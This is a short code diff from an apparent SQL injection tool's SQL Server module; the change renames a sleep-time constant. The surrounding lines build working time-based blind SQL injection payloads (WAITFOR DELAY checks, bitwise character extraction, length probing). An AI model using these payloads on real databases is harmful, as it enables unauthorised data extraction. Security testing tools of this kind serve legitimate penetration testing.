@@ -133,17 +133,17 @@ public class SQLServerVendor extends AbstractVendor {
 
     @Override
     public String getSqlTimeCheck(String check) {
-        return ";if(" + check + ")WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP + "'--+";
+        return ";if(" + check + ")WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP_TIME + "'--+";
     }
 
     @Override
     public String getSqlTimeBitCheck(String inj, int indexCharacter, int bit) {
-        return ";if(0!=(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "))WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP + "'--+";
+        return ";if(0!=(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "))WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP_TIME + "'--+";
     }
 
     @Override
     public String getSqlTimeLengthCheck(String inj, int indexCharacter) {
-        return ";if(len(" + inj + ")>" + indexCharacter + ")WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP + "'--+";
+        return ";if(len(" + inj + ")>" + indexCharacter + ")WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP_TIME + "'--+";
     }
 
     @Override
